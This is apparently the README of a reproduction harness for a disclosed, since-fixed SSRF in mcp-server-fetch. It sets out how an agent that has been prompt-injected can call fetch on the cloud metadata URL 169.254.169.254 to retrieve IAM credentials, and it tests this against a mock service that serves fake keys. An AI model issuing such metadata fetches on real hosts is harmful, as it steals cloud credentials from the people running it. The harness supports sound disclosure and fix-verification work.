# SSRF PoC harness — `mcp-server-fetch` cloud-metadata reach

End-to-end runnable reproduction of the SSRF in `mcp-server-fetch` that was disclosed at [modelcontextprotocol/servers#4143](https://github.com/modelcontextprotocol/servers/issues/4143) on 2026-05-12 and fixed in PR [#4226](https://github.com/modelcontextprotocol/servers/pull/4226) on 2026-05-22.

Companion to [`poc/dns-rebind/`](../dns-rebind/). Both disclosed vulnerability classes (outbound SSRF and inbound DNS rebinding) now have a `make demo` reproduction.

This harness is **not embargoed**. The vulnerability is already public via the upstream GitHub issue + PR; the harness just packages reproduction so anyone can verify in seconds without needing an AWS account.

## What this demonstrates

`mcp-server-fetch` v2025.4.7 (and earlier) exposes a `fetch` tool that accepts any URL from an agent tool call and proxies it through `httpx.get()` with no scheme allowlist, no host denylist, and no protection against RFC-reserved-range addresses. An agent coerced via prompt injection into calling `fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>/")` on a cloud-hosted host running IMDSv1 or IMDSv2-Optional will retrieve live IAM credentials.

The PR #4226 fix adds: scheme allowlist (`http`, `https` only), RFC-reserved-range denylist (loopback, link-local, private, reserved, multicast, unspecified), and per-redirect validation (the destination of every HTTP redirect is re-validated). The same `fetch` call that previously returned credentials now returns *"Fetching private or non-public IP addresses is not allowed."*

## Architecture

```
+--------------------------------------------------------+
|  Docker network: metadata-net (subnet 169.254.0.0/16)  |
|                                                        |
|  +-----------------+        +-----------------------+  |
|  |  IMDS mock      |        |  attacker container    | |
|  |  static IP      |        |  - mcp-server-fetch    | |
|  |  169.254.169.254|<-------|    v2025.4.7 (pinned)  | |
|  |  (Python stdlib |  GET   |  - attack.py JSON-RPC  | |
|  |   http.server)  |  -->   |    driver              | |
|  +-----------------+        +-----------------------+  |
+--------------------------------------------------------+
```

Two containers on a custom `169.254.0.0/16` Docker bridge network. The IMDS mock claims the canonical EC2 metadata IP `169.254.169.254` inside the network and serves fake (but realistic-shaped) IAM credentials.

The attacker container spawns `python -m mcp_server_fetch` as a stdio subprocess, runs the MCP protocol handshake, and issues a single `tools/call` against the `fetch` tool with the IMDS metadata URL. The pre-fix `fetch` returns the body of the HTTP response. The attacker inspects that body for the `AKIA-FAKE` literal that the IMDS mock embeds in its fake credential response. If the literal appears, the vulnerability is confirmed and the attacker container exits 0.

## Credential values are obviously fake

The IMDS mock's fake credentials are intentionally non-credible:

```json
{
  "Code": "Success",
  "AccessKeyId": "AKIA-FAKE-NEVER-USE-DEMO",
  "SecretAccessKey": "FAKE-SECRET-KEY-DO-NOT-USE-IN-REAL-CODE",
  "Token": "FAKE-SESSION-TOKEN-POC-DEMO-ONLY-NEVER-USE",
  ...
}
```

No real cloud account is involved. No real exfiltration happens. The harness confirms vulnerability shape only.

## Run it

```bash
cd poc/ssrf/

# Fast Python-only probe (no Docker required)
make demo-quick

# Full containerized end-to-end (requires Docker)
make demo-full

# Both, sequentially
make demo

# Verify the fix
MCP_FETCH_VERSION=<post-PR-#4226-release> make demo-fixed

# Cleanup
make clean
```

## Expected output (demo-full, vulnerable)

```
=================================================================
 mcp-witness SSRF PoC reproduction
=================================================================
 mcp-server-fetch version: 2025.4.7
 target URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/poc-demo-role
 expected outcome (vulnerable):  AKIA-FAKE token returned
 expected outcome (fixed):       URL refused as private/non-public

[1/4] initialize handshake ...
[2/4] tools/list ...
        tools available: ['fetch']
[3/4] tools/call fetch(url='http://169.254.169.254/latest/meta-data/iam/security-credentials/poc-demo-role') ...
[4/4] analyzing response ...

---  response body  ---
{
  "Code": "Success",
  "AccessKeyId": "AKIA-FAKE-NEVER-USE-DEMO",
  ...
}
--- (end response) ----

=================================================================
 PoC RESULT: VULNERABLE
=================================================================
 The fake AKIA token ('AKIA-FAKE') appears in the response.
 mcp-server-fetch retrieved cloud-metadata credentials via the
 agent tool surface with no scheme/host validation.

 disclosure: modelcontextprotocol/servers#4143
 fix:        modelcontextprotocol/servers PR #4226 (kgarg2468)
```

## Expected output (demo-fixed, post-PR-#4226)

```
=================================================================
 mcp-witness SSRF PoC reproduction
=================================================================
 mcp-server-fetch version: <post-fix-version>
 ...

---  response body  ---
Fetching private or non-public IP addresses is not allowed.
--- (end response) ----

=================================================================
 PoC RESULT: FIX VERIFIED
=================================================================
```

## Exit codes

Useful for CI / monitoring. The Docker compose `--exit-code-from attacker` flag surfaces these to `make demo`.

| Code | Meaning |
|---|---|
| 0 | VULNERABLE — `AKIA-FAKE` came back in the JSON-RPC response |
| 1 | FIX VERIFIED — the post-PR-#4226 refusal message came back |
| 2 | INFRASTRUCTURE FAILURE — couldn't spawn mcp-server-fetch, couldn't reach IMDS, etc |
| 3 | UNEXPECTED — response matched neither pattern |

`quick_probe.py` accepts `--exit-nonzero-on-vuln` to flip the convention for monitoring use (exit 1 on vuln, 0 on no-vuln).

## Layout

```
poc/ssrf/
├── Makefile             demo / demo-quick / demo-full / demo-fixed / clean
├── README.md            this file
├── docker-compose.yml   custom 169.254.0.0/16 network + service definitions
├── quick_probe.py       pure-Python no-Docker probe (~3 seconds, no install)
├── imds/                mock cloud metadata service container
│   ├── Dockerfile       python:3.11-slim + healthcheck
│   └── server.py        http.server-based mock; serves fake credentials
└── attacker/            agent-side reproduction container
    ├── Dockerfile       python:3.11-slim + mcp-server-fetch pinned
    └── attack.py        stdio JSON-RPC driver + response classifier
```

## Why this matters

The original disclosure was verified on EC2 with real IAM credentials in [`docs/audit-runbook-ec2-ssrf-verification.md`](../../docs/audit-runbook-ec2-ssrf-verification.md). That runbook is still the right tool for verifying against real cloud infrastructure. This harness is the right tool for everyone else: anyone reading the disclosure record who wants to confirm the vulnerability shape can do so with `make demo-full` instead of standing up AWS infrastructure.

The pairing of `poc/dns-rebind/` + `poc/ssrf/` makes the mcp-witness reproduction-harness collection a coherent artifact independent of the scanner itself. Each disclosed vulnerability class has a one-command reproduction.

## Related

- Finding entry: [`findings/2026-05-11-MCP-D-003-fetch-direct-environment-dependent-ssrf.md`](../../findings/2026-05-11-MCP-D-003-fetch-direct-environment-dependent-ssrf.md)
- Disclosure record: tracked at [modelcontextprotocol/servers#4143](https://github.com/modelcontextprotocol/servers/issues/4143)
- Fix verification runbook (real EC2): [`docs/audit-runbook-ec2-ssrf-verification.md`](../../docs/audit-runbook-ec2-ssrf-verification.md)
- Sibling DNS-rebind harness: [`poc/dns-rebind/`](../dns-rebind/)
